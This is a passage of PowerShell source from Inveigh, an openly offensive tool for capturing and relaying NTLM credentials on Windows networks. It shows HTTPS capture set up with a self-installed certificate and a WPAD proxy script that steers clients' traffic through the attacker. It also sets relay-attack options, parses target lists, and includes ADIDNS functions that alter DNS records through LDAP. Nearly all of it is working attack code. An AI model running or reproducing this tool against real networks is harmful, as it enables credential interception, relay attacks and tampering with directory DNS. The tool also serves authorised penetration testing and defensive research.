= new-object -com \"X509Enrollment.CX509ExtensionBasicConstraints\"\n\t\t\t    $certificate_basic_constraints.InitializeEncode(\"true\",1)\n                $certificate.X509Extensions.Add($certificate_basic_constraints)\n                $certificate.Encode()\n                $certificate_enrollment = new-object -com \"X509Enrollment.CX509Enrollment\"\n\t\t\t    $certificate_enrollment.InitializeFromRequest($certificate)\n\t\t\t    $certificate_data = $certificate_enrollment.CreateRequest(0)\n                $certificate_enrollment.InstallResponse(2,$certificate_data,0,\"\")\n                $inveigh.certificate = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})\n                $inveigh.HTTPS = $true\n                $inveigh.output_queue.Add(\"[+] HTTPS Capture/Relay = Enabled\")  > $null\n            }\n            else\n            {\n\n                if($HTTPSForceCertDelete -eq 'Y')\n                {\n                    $inveigh.HTTPS_force_certificate_delete = $true\n                }\n\n                $inveigh.HTTPS_existing_certificate = $true\n                $inveigh.output_queue.Add(\"[+] HTTPS Capture = Using Existing Certificate\")  > $null\n            }\n\n        }\n        catch\n        {\n            $HTTPS = \"N\"\n            $inveigh.HTTPS = $false\n            $inveigh.output_queue.Add(\"[-] HTTPS Capture/Relay Disabled Due To Certificate Error\")  > $null\n        }\n\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] HTTPS Capture/Relay = Disabled\")  > $null\n}\n\nif($HTTP -eq 'Y' -or $HTTPS -eq 'Y')\n{\n\n    if($Challenge)\n    {\n        $inveigh.output_queue.Add(\"[+] HTTP NTLM Challenge = $Challenge\")  > $null\n    }\n\n    if($MachineAccounts -eq 'N')\n    {\n        $inveigh.output_queue.Add(\"[+] Machine Account Capture = Disabled\") > $null\n        $inveigh.machine_accounts = $false\n    }\n    else\n    {\n        $inveigh.machine_accounts = $true\n    }\n\n    $inveigh.output_queue.Add(\"[+] WPAD Authentication = $WPADAuth\") > $null\n\n    if($WPADAuth -eq \"NTLM\")\n    {\n        $WPADAuthIgnore = ($WPADAuthIgnore | Where-Object {$_ -and $_.Trim()})\n\n        if($WPADAuthIgnore.Count -gt 0)\n        {\n            $inveigh.output_queue.Add(\"[+] WPAD NTLM Authentication Ignore List = \" + ($WPADAuthIgnore -join \",\"))  > $null\n        }\n\n    }\n\n}\n\nif($Proxy -eq 'Y')\n{\n\n    if($proxy_port_check)\n    {\n        $HTTP = \"N\"\n        $inveigh.output_queue.Add(\"[+] Proxy Capture/Relay Disabled Due To In Use Port $ProxyPort\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] Proxy Capture/Relay = Enabled\")  > $null\n        $inveigh.output_queue.Add(\"[+] Proxy Port = $ProxyPort\") > $null\n        $ProxyPortFailover = $ProxyPort + 1\n        $WPADResponse = \"function FindProxyForURL(url,host){return `\"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`\";}\"\n        $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})\n\n        if($ProxyIgnore.Count -gt 0)\n        {\n            $inveigh.output_queue.Add(\"[+] Proxy Ignore List = \" + ($ProxyIgnore -join \",\"))  > $null\n        }\n\n    }\n\n}\n\nif($DomainMapping)\n{\n    $inveigh.output_queue.Add(\"[+] Domain Mapping = \" + ($DomainMapping -join \",\"))  > $null\n    $inveigh.netBIOS_domain = $DomainMapping[0]\n    $inveigh.DNS_domain = $DomainMapping[1]\n}\n\n$inveigh.output_queue.Add(\"[+] Relay Attack = \" + ($Attack -join \",\")) > $null\n\n# math taken from https://gallery.technet.microsoft.com/scriptcenter/List-the-IP-addresses-in-a-60c5bb6b\n\nfunction Convert-RangetoIPList\n{\n    param($IP,$CIDR,$Start,$End)\n\n    function Convert-IPtoINT64\n    { \n        param($IP) \n        \n        $octets = $IP.split(\".\")\n\n        return [int64]([int64]$octets[0] * 16777216 + [int64]$octets[1]*65536 + [int64]$octets[2] * 256 + [int64]$octets[3]) \n    } \n    \n    function Convert-INT64toIP\n    { \n        param ([int64]$int) \n        return (([math]::truncate($int/16777216)).tostring() + \".\" +([math]::truncate(($int%16777216)/65536)).tostring() + \".\" + ([math]::truncate(($int%65536)/256)).tostring() + \".\" +([math]::truncate($int%256)).tostring())\n    }\n\n    $target_list = New-Object System.Collections.ArrayList\n    \n    if($IP)\n    {\n        $IP_address = [System.Net.IPAddress]::Parse($IP)\n    }\n\n    if($CIDR)\n    {\n        $mask_address = [System.Net.IPAddress]::Parse((Convert-INT64toIP -int ([convert]::ToInt64((\"1\" * $CIDR + \"0\" * (32 - $CIDR)),2))))\n    }\n\n    if($IP)\n    {\n        $network_address = New-Object System.Net.IPAddress ($mask_address.address -band $IP_address.address)\n    }\n\n    if($IP)\n    {\n        $broadcast_address = New-Object System.Net.IPAddress (([System.Net.IPAddress]::parse(\"255.255.255.255\").address -bxor $mask_address.address -bor $network_address.address))\n    } \n    \n    if($IP)\n    { \n        $start_address = Convert-IPtoINT64 -ip $network_address.IPAddressToString\n        $end_address = Convert-IPtoINT64 -ip $broadcast_address.IPAddressToString\n    }\n    else\n    { \n        $start_address = Convert-IPtoINT64 -ip $start \n        $end_address = Convert-IPtoINT64 -ip $end \n    } \n    \n    for($i = $start_address; $i -le $end_address; $i++) \n    { \n        $IP_address = Convert-INT64toIP -int $i\n        $target_list.Add($IP_address) > $null\n    }\n\n    if($network_address)\n    {\n        $target_list.Remove($network_address.IPAddressToString)\n    }\n\n    if($broadcast_address)\n    {\n        $target_list.Remove($broadcast_address.IPAddressToString)\n    }\n    \n    return $target_list\n}\n\nfunction Get-TargetList\n{\n    param($targets)\n\n    $target_list = New-Object System.Collections.ArrayList\n\n    for($i=0;$i -lt $targets.Count;$i++)\n    {\n\n        if($targets[$i] -like \"*-*\")\n        {\n            $target_array = $targets[$i].split(\"-\")\n\n            if($target_array[0] -match \"\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\" -and\n            $target_array[1] -notmatch \"\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\")\n            {\n\n                if($target_array.Count -ne 2 -or $target_array[1] -notmatch \"^[\\d]+$\" -or $target_array[1] -gt 254)\n                {\n                    Write-Output \"[!] Invalid target $($target[$i])\"\n                    throw\n                }\n                else\n                {\n                    $IP_network_begin = $target_array[0].ToCharArray()\n                    [Array]::Reverse($IP_network_begin)\n                    $IP_network_begin = -join($IP_network_begin)\n                    $IP_network_begin = $IP_network_begin.SubString($IP_network_begin.IndexOf(\".\"))\n                    $IP_network_begin = $IP_network_begin.ToCharArray()\n                    [Array]::Reverse($IP_network_begin)\n                    $IP_network_begin = -join($IP_network_begin)\n                    $IP_range_end = $IP_network_begin + $target_array[1]\n                    $targets[$i] = $target_array[0] + \"-\" + $IP_range_end\n                }\n\n            }\n\n        }\n\n    }\n\n    ForEach($entry in $targets)\n    {\n        $entry_split = $null\n\n        if($entry.contains(\"/\"))\n        {\n            $entry_split = $entry.Split(\"/\")\n            $IP = $entry_split[0]\n            $CIDR = $entry_split[1]\n            [Array]$target_range = Convert-RangetoIPList -IP $IP -CIDR $CIDR\n            $target_list.AddRange($target_range)\n        }\n        elseif($entry.contains(\"-\"))\n        {\n            $entry_split = $entry.Split(\"-\")\n\n            if($entry_split[0] -match \"\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\" -and\n            $entry_split[1] -match \"\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\")\n            {\n                $start_address = $entry_split[0]\n                $end_address = $entry_split[1]\n                [Array]$target_range = Convert-RangetoIPList -Start $start_address -End $end_address\n                $target_list.AddRange($target_range)\n            }\n            else\n            {\n                $target_list.Add($entry) > $null    \n            }\n            \n        }\n        else\n        {\n            $target_list.Add($entry) > $null\n        }\n\n    }\n\n    return $target_list\n}\n\nif($Target)\n{\n\n    if($Target.Count -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Target = \" + ($Target -join \",\")) > $null\n    }\n    elseif($Target.Count -gt 3)\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Targets = \" + ($Target[0..2] -join \",\") + \"...\") > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Targets = \" + ($Target -join \",\")) > $null\n    }\n\n    $inveigh.output_queue.Add(\"[*] Parsing Relay Target List\") > $null\n    $inveigh.target_list = New-Object System.Collections.ArrayList\n    [Array]$target_range = Get-TargetList $Target\n    $inveigh.target_list.AddRange($target_range)\n}\n\nif($TargetExclude)\n{\n\n    if($TargetExclude.Count -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Target Exclude = \" + ($TargetExclude -join \",\")) > $null\n    }\n    elseif($TargetExclude.Count -gt 3)\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Targets Exclude = \" + ($TargetExclude[0..2] -join \",\") + \"...\") > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Targets Exclude = \" + ($TargetExclude -join \",\")) > $null\n    }\n\n    $inveigh.output_queue.Add(\"[*] Parsing Relay Target Exclude List\") > $null\n    $inveigh.target_exclude_list = New-Object System.Collections.ArrayList\n    [Array]$target_range = Get-TargetList $TargetExclude\n    $inveigh.target_exclude_list.AddRange($TargetExclude)\n}\n\nif($Username)\n{\n\n    if($Username.Count -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Username = \" + ($Username -join \",\")) > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] Relay Usernames = \" + ($Username -join \",\")) > $null\n    }\n\n}\n\nif($RelayAutoDisable -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[+] Relay Auto Disable = Enabled\") > $null\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] Relay Auto Disable = Disabled\") > $null\n}\n\nif($RelayAutoExit -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[+] Relay Auto Exit = Enabled\") > $null\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] Relay Auto Exit = Disabled\") > $null\n}\n\nif($Service)\n{\n    $inveigh.output_queue.Add(\"[+] Relay Service = $Service\") > $null\n}\n\nif($ConsoleOutput -ne 'N')\n{\n    \n    if($ConsoleOutput -eq 'Y')\n    {\n        $inveigh.output_queue.Add(\"[+] Real Time Console Output = Enabled\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] Real Time Console Output = $ConsoleOutput\")  > $null\n    }\n\n    $inveigh.console_output = $true\n\n    if($ConsoleStatus -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Console Status = $ConsoleStatus Minute\")  > $null\n    }\n    elseif($ConsoleStatus -gt 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Console Status = $ConsoleStatus Minutes\")  > $null\n    }\n\n}\nelse\n{\n\n    if($inveigh.tool -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[!] Real Time Console Output Disabled Due To External Tool Selection\") > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] Real Time Console Output = Disabled\") > $null\n    }\n\n}\n\nif($ConsoleUnique -eq 'Y')\n{\n    $inveigh.console_unique = $true\n}\nelse\n{\n    $inveigh.console_unique = $false\n}\n\nif($FileOutput -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[+] Real Time File Output = Enabled\") > $null\n    $inveigh.output_queue.Add(\"[+] Output Directory = $output_directory\") > $null\n    $inveigh.file_output = $true\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] Real Time File Output = Disabled\") > $null\n}\n\nif($FileUnique -eq 'Y')\n{\n    $inveigh.file_unique = $true\n}\nelse\n{\n    $inveigh.file_unique = $false\n}\n\nif($LogOutput -eq 'Y')\n{\n    $inveigh.log_output = $true\n}\nelse\n{\n    $inveigh.log_output = $false\n}\n\nif($RunTime -eq 1)\n{\n    $inveigh.output_queue.Add(\"[+] Run Time = $RunTime Minute\") > $null\n}\nelseif($RunTime -gt 1)\n{\n    $inveigh.output_queue.Add(\"[+] Run Time = $RunTime Minutes\") > $null\n}\n\nif($ShowHelp -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[!] Run Stop-Inveigh to stop\") > $null\n        \n    if($inveigh.console_output)\n    {\n        $inveigh.output_queue.Add(\"[*] Press any key to stop console output\") > $null\n    }\n\n}\n\nwhile($inveigh.output_queue.Count -gt 0)\n{\n\n    switch -Wildcard ($inveigh.output_queue[0])\n    {\n\n        {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n        {\n\n            if($inveigh.status_output -and $inveigh.output_stream_only)\n            {\n                Write-Output($inveigh.output_queue[0] + $inveigh.newline)\n            }\n            elseif($inveigh.status_output)\n            {\n                Write-Warning($inveigh.output_queue[0])\n            }\n            \n            if($inveigh.file_output)\n            {\n                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null\n            }\n\n            if($inveigh.log_output)\n            {\n                $inveigh.log.Add($inveigh.output_queue[0]) > $null\n            }\n\n            $inveigh.output_queue.RemoveAt(0)\n        }\n\n        default\n        {\n\n            if($inveigh.status_output -and $inveigh.output_stream_only)\n            {\n                Write-Output($inveigh.output_queue[0] + $inveigh.newline)\n            }\n            elseif($inveigh.status_output)\n            {\n                Write-Output($inveigh.output_queue[0])\n            }\n\n            if($inveigh.file_output)\n            {\n\n                if ($inveigh.output_queue[0].StartsWith(\"[+] \") -or $inveigh.output_queue[0].StartsWith(\"[*] \"))\n                {\n                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null\n                }\n                else\n                {\n                    $inveigh.log_file_queue.Add(\"[redacted]\") > $null    \n                }\n\n            }\n\n            if($inveigh.log_output)\n            {\n                $inveigh.log.Add($inveigh.output_queue[0]) > $null\n            }\n\n            $inveigh.output_queue.RemoveAt(0)\n        }\n\n    }\n\n}\n\nif(!$inveigh.netBIOS_domain)\n{\n    $inveigh.status_output = $false\n    $inveigh.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value\n    $inveigh.computer_name = (Get-ChildItem -path env:computername).Value\n\n    try\n    {\n        $inveigh.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()\n        $inveigh.DNS_computer_name = ($inveigh.computer_name + \".\" + $inveigh.DNS_domain).ToLower()\n\n        if(!$inveigh.domain_mapping_table.ContainsKey($inveigh.netBIOS_domain))\n        {\n            $inveigh.domain_mapping_table.Add($inveigh.netBIOS_domain,$inveigh.DNS_domain)\n        }\n\n    }\n    catch\n    {\n        $inveigh.DNS_domain = $inveigh.netBIOS_domain\n        $inveigh.DNS_computer_name = $inveigh.computer_name\n    }\n\n}\nelse\n{\n\n    if(!$inveigh.domain_mapping_table.ContainsKey($inveigh.netBIOS_domain))\n    {\n        $inveigh.domain_mapping_table.Add($inveigh.netBIOS_domain,$inveigh.DNS_domain)\n    }\n\n}\n\nif($inveigh.enumerate)\n{\n    $inveigh.output_queue.Add(\"[*] Performing DNS on imported targets\") > $null\n\n    for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n    {\n\n        if($inveigh.enumerate[$i].Hostname -and !$inveigh.enumerate[$i].IP -and $inveigh.enumerate[$i].\"DNS Record\" -ne $false)\n        {\n            $DNS_lookup = $true\n\n            try\n            {\n                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.enumerate[$i].Hostname)\n\n                foreach($entry in $IP_list.AddressList)\n                {\n\n                    if($entry.AddressFamily -eq 'InterNetwork')\n                    {\n                        $inveigh.enumerate[$i].IP = $entry.IPAddressToString\n                        $inveigh.enumerate[$i].\"DNS Record\" = $true\n                        $inveigh.enumerate[$i].\"IPv6 Only\" = $false\n                        $target_enumerate_keep = $true\n                    }\n\n                }\n\n                if(!$target_enumerate_keep)\n                {\n                    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] IPv6 target $($inveigh.enumerate[$i].Hostname) not supported\") > $null\n                    $inveigh.enumerate[$i].\"IPv6 Only\" = $true\n                }\n\n            }\n            catch\n            {\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.enumerate[$i].Hostname) failed\") > $null\n                $inveigh.enumerate[$i].\"DNS Record\" = $false\n            }\n\n            $target_enumerate_keep = $false\n            $IP_list = $null\n        }\n\n    }\n\n    if($DNS_lookup)\n    {\n        $inveigh.output_queue.Add(\"[+] DNS lookups complete\") > $null\n        $DNS_lookup = $false\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] No DNS lookups required\") > $null\n    }\n\n}\n\nif($inveigh.target_list)\n{\n    $inveigh.output_queue.Add(\"[*] Performing DNS lookups on target list\") > $null\n\n    for($i = 0;$i -lt $inveigh.target_list.Count;$i++)\n    {\n\n        if(!($inveigh.target_list[$i] -as [IPAddress] -as [Bool]))\n        {\n            $DNS_lookup = $true\n\n            try\n            {\n                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.target_list[$i])\n\n                foreach($entry in $IP_list.AddressList)\n                {\n\n                    if($entry.AddressFamily -eq 'InterNetwork')\n                    {\n                        $inveigh.target_list[$i] = $entry.IPAddressToString\n                        $target_keep = $true\n                    }\n\n                    if(!$target_keep)\n                    {\n                        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported\") > $null\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list\") > $null\n                        $inveigh.target_list.RemoveAt($i)\n                        $i -= 1\n                    }\n\n                }\n                        \n            }\n            catch\n            {\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_list[$i]) failed\") > $null\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list\") > $null\n                $inveigh.target_list.RemoveAt($i)\n                $i -= 1\n            }\n\n            $target_keep = $false\n            $IP_list = $null\n        }\n\n    }\n\n    if($DNS_lookup)\n    {\n        $inveigh.output_queue.Add(\"[+] DNS lookups on complete\") > $null\n        $DNS_lookup = $false\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] No DNS lookups required\") > $null\n    }\n\n}\n\nif($inveigh.target_exclude_list)\n{\n    $inveigh.output_queue.Add(\"[*] Performing DNS lookups on excluded targets list\") > $null\n\n    for($i = 0;$i -lt $inveigh.target_exclude_list.Count;$i++)\n    {\n\n        if(!($inveigh.target_exclude_list[$i] -as [IPAddress] -as [Bool]))\n        {\n            $DNS_lookup = $true\n\n            try\n            {\n                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.target_exclude_list[$i])\n\n                foreach($entry in $IP_list.AddressList)\n                {\n\n                    if($entry.AddressFamily -eq 'InterNetwork')\n                    {\n                        $inveigh.target_exclude_list[$i] = $entry.IPAddressToString\n                        $target_exclude_keep = $true\n                    }\n\n                }\n\n                if(!$target_exclude_keep)\n                {\n                    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported\") > $null\n                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list\") > $null\n                    $inveigh.target_exclude_list.RemoveAt($i)\n                    $i -= 1\n                }\n\n            }\n            catch\n            {\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_exclude_list[$i]) failed\") > $null\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list\") > $null\n                $inveigh.target_exclude_list.RemoveAt($i)\n                $i -= 1\n            }\n\n            $target_exclude_keep = $false\n            $IP_list = $null\n        }\n\n    }\n\n    if($DNS_lookup)\n    {\n        $inveigh.output_queue.Add(\"[+] DNS lookups complete\") > $null\n        $DNS_lookup = $false\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] No DNS lookups required\") > $null\n    }\n\n}\n\nif($inveigh.target_list -and $inveigh.target_exclude_list)\n{\n    $inveigh.target_list = Compare-Object -ReferenceObject $inveigh.target_exclude_list -DifferenceObject $inveigh.target_list | Where-Object {$_.sideIndicator -eq \"=>\"} | ForEach-Object {$_.InputObject}\n}\n\nif(!$inveigh.target_list -and !$inveigh.enumerated)\n{\n    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Disabling relay due empty target list\") > $null\n    $inveigh.SMB_relay = $false\n}\n\n$inveigh.status_output = $false\n\n#endregion\n#region begin script blocks\n\n# Shared Basic Functions ScriptBlock\n$shared_basic_functions_scriptblock =\n{\n\n    function Get-UInt16DataLength\n    {\n        param ([Int]$Start,[Byte[]]$Data)\n\n        $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)\n\n        return $data_length\n    }\n\n    function Get-UInt32DataLength\n    {\n        param ([Int]$Start,[Byte[]]$Data)\n\n        $data_length = [System.BitConverter]::ToUInt32($Data[$Start..($Start + 3)],0)\n\n        return $data_length\n    }\n\n    function Convert-DataToString\n    {\n        param ([Int]$Start,[Int]$Length,[Byte[]]$Data)\n\n        $string_data = [System.BitConverter]::ToString($Data[$Start..($Start + $Length - 1)])\n        $string_data = $string_data -replace \"-00\",\"\"\n        $string_data = $string_data.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)\n\n        return $string_extract\n    }\n\n    function New-RelayEnumObject\n    {\n        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,\n            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,\n            $IPv6Only,$Targeted,$Enumerate,$Execute)\n\n        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}\n        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}\n        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}\n        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}\n        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}\n        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}\n        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}\n        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}\n\n        $relay_object = New-Object PSObject\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Index\" $inveigh.enumerate.Count\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IP\" $IP\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Hostname\" $Hostname\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"DNS Domain\" $DNSDomain\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"netBIOS Domain\" $netBIOSDomain\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Sessions\" $Sessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Users\" $AdministratorUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Groups\" $AdministratorGroups\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Privileged\" $Privileged\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Shares\" $Shares\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions\" $NetSessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions Mapped\" $NetSessionsMapped\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Local Users\" $LocalUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB2.1\" $SMB2\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Signing\" $Signing\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB Server\" $SMBServer\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"DNS Record\" $DNSRecord\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IPv6 Only\" $IPv6Only\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Targeted\" $Targeted\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Enumerate\" $Enumerate\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Execute\" $Execute\n        \n        return $relay_object\n    }\n\n    function Invoke-SessionUpdate\n    {\n        param ([String]$domain,[String]$username,[String]$hostname,[String]$IP)\n\n        if($inveigh.domain_mapping_table.$domain)\n        {\n            $session = ($username + \"@\" + $inveigh.domain_mapping_table.$domain).ToUpper()\n            $hostname_full = ($hostname + \".\" + $inveigh.domain_mapping_table.$domain).ToUpper()\n        }\n        else\n        {\n            $session = $domain + \"\\\" + $username\n        }\n\n        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n        {\n\n            if($inveigh.enumerate[$i].Hostname -eq $hostname_full -or $inveigh.enumerate[$i].IP -eq $IP)\n            {\n\n                if(!$inveigh.enumerate[$i].Hostname)\n                {\n                    $inveigh.enumerate[$target_index].Hostname = $hostname_full\n                }\n\n                [Array]$session_list = $inveigh.enumerate[$i].Sessions\n\n                if($inveigh.domain_mapping_table.$domain)\n                {\n\n                    for($j = 0;$j -lt $session_list.Count;$j++)\n                    {\n\n                        if($session_list[$j] -like \"$domain\\*\")\n                        {\n                            $session_username = ($session_list[$j].Split(\"\\\"))[1]\n                            $session_update = $session_username + \"@\" + $inveigh.domain_mapping_table.$domain\n                            $session_list[$j] += $session_update\n                            $inveigh.enumerate[$i].Sessions = $session_list\n                        }\n\n                    }\n\n                }\n\n                if($session_list -notcontains $session)\n                {\n                    $session_list += $session\n                    $inveigh.enumerate[$i].Sessions = $session_list\n                }\n\n                $target_updated = $true\n                break\n            }\n\n        }\n     \n        if(!$target_updated)\n        {\n            $inveigh.enumerate.Add((New-RelayEnumObject -IP $IP -Hostname $hostname_full -Sessions $session)) > $null\n        }\n\n    }\n\n}\n\n# ADIDNS Functions ScriptBlock\n$ADIDNS_functions_scriptblock =\n{\n\n    function Disable-ADIDNSNode\n    {\n\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$true)][String]$Node,\n            [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\")][String]$Partition = \"DomainDNSZones\",\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential\n        )\n\n        $SOASerialNumberArray = New-SOASerialNumberArray -DomainController $DomainController -Zone $Zone\n\n        $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"\n        $DC_array = $Domain.Split(\".\")\n\n        foreach($DC in $DC_array)\n        {\n            $distinguished_name += \",DC=$DC\"\n        }\n\n        if($Credential)\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainController/$distinguished_name\",$Credential.UserName,$Credential.GetNetworkCredential().Password)\n        }\n        else\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry \"LDAP://$DomainController/$distinguished_name\"\n        }\n\n        $timestamp = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date \"1/1/1601\").Ticks)\n        $timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($timestamp))\n        $timestamp = $timestamp.Split(\"-\") | ForEach-Object{[System.Convert]::ToInt16($_,16)}\n\n        [Byte[]]$DNS_record = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +\n            $SOASerialNumberArray[0..3] +\n            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +\n            $timestamp\n\n        try\n        {\n            $directory_entry.InvokeSet('dnsRecord',$DNS_record)\n            $directory_entry.InvokeSet('dnsTombstoned',$true)\n            $directory_entry.SetInfo()\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone\") > $null\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        }\n\n        if($directory_entry.Path)\n        {\n            $directory_entry.Close()\n        }\n\n    }\n\n    function New-SOASerialNumberArray\n    {\n\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$false)][String]$Zone\n        )\n\n        $Zone = $Zone.ToLower()\n\n        function Convert-DataToUInt16($Field)\n        {\n            [Array]::Reverse($Field)\n            return [System.BitConverter]::ToUInt16($Field,0)\n        }\n\n        function ConvertFrom-PacketOrderedDictionary($OrderedDictionary)\n        {\n\n            foreach($field in $OrderedDictionary.Values)\n            {\n                $byte_array += $field\n            }\n\n            return $byte_array\n        }\n\n        function New-RandomByteArray\n        {\n            param([Int]$Length,[Int]$Minimum=1,[Int]$Maximum=255)\n\n            [String]$random = [String](1..$Length | ForEach-Object 